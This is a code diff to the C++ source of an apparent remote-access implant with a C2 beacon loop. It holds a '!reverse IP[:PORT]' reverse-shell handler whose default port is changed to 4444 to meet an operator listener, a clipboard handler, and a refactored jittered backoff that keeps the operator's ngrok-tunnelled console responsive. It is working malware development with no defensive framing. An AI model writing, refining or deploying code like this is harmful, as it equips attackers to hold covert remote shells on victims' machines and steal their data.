@@ -710,9 +710,12 @@ static std::wstring HandleClipboard(const std::string& args) {
 // =====================================================================
 //  REVERSE SHELL — built from parts at runtime, no static b64 blob
 // =====================================================================
+// Default port matches `c2_cli.py listen` (4444) so `!reverse <ip>` and the
+// operator listener meet without either side naming a port. Deliberately NOT
+// GHOST_C2_PORT (443): that is the beacon endpoint, not a shell listener.
 static std::wstring HandleReverse(const std::string& args) {
-    if (args.empty()) return L"Usage: !reverse IP[:PORT] (default port 443)";
-    std::string ip, port = "443";
+    if (args.empty()) return L"Usage: !reverse IP[:PORT] (default port 4444)";
+    std::string ip, port = "4444";
     size_t colon = args.find(':');
     if (colon == std::string::npos) {
         ip = args;
@@ -1830,6 +1833,29 @@ BOOL PingC2() {
 }
 
 // =====================================================================
+//  FAILURE BACKOFF
+// =====================================================================
+// One schedule for every way a beacon pass can fail, driven entirely by
+// config.hpp so the advertised knobs are the ones actually in force:
+//   BEACON_MIN * BACKOFF_FACTOR^(failures-1), holding after MAX_FAILURES,
+// capped at BACKOFF_MAX_SEC.
+// In rapid-poll mode (shell / live view) the wait is clamped to a few seconds
+// so one ngrok hiccup cannot freeze the operator's console.
+static void BeaconFailureBackoff(DWORD failures) {
+    DWORD steps = std::min<DWORD>(failures, config::MAX_FAILURES);
+    DWORD64 sec = config::BEACON_MIN;
+    for (DWORD i = 1; i < steps && sec < config::BACKOFF_MAX_SEC; ++i)
+        sec *= config::BACKOFF_FACTOR;
+    if (sec > config::BACKOFF_MAX_SEC) sec = config::BACKOFF_MAX_SEC;
+
+    DWORD backoffSec = static_cast<DWORD>(sec);
+    if (g_BeaconOverride > 0 && backoffSec > 3) backoffSec = 3;
+
+    DebugLog(L"Backoff " + std::to_wstring(backoffSec) + L"s");
+    JitterSleep(backoffSec, g_BeaconOverride > 0 ? backoffSec + 1 : backoffSec + 30);
+}
+
+// =====================================================================
 //  MAIN BEACON LOOP
 // =====================================================================
 DWORD BeaconLoop(const Session& session) {
@@ -1873,15 +1899,7 @@ DWORD BeaconLoop(const Session& session) {
                 ++failures;
                 wasDown = true;
                 DebugLog(L"Beacon fail #" + std::to_wstring(failures));
-
-                // Exponential backoff capped at 30 min — but in rapid-poll
-                // mode (shell / live view) retry within seconds so one
-                // ngrok hiccup doesn't freeze the operator's console.
-                DWORD backoffSec = config::BEACON_MIN * (1u << std::min<DWORD>(failures - 1u, 6u));
-                if (backoffSec > 1800) backoffSec = 1800;
-                if (g_BeaconOverride > 0 && backoffSec > 3) backoffSec = 3;
-                DebugLog(L"Backoff " + std::to_wstring(backoffSec) + L"s");
-                JitterSleep(backoffSec, g_BeaconOverride > 0 ? backoffSec + 1 : backoffSec + 30);
+                BeaconFailureBackoff(failures);
                 continue;
             }
 
@@ -1950,12 +1968,12 @@ DWORD BeaconLoop(const Session& session) {
 
         } catch (const std::exception& e) {
             DebugLog(L"BeaconLoop exception: " + UTF8ToWString(e.what()));
-            failures++;
-            Sleep(15000);
+            ++failures;
+            BeaconFailureBackoff(failures);
         } catch (...) {
             DebugLog(L"BeaconLoop: unknown exception");
-            failures++;
-            Sleep(15000);
+            ++failures;
+            BeaconFailureBackoff(failures);
         }
     }
     return 1; // unreachable, but satisfies compiler
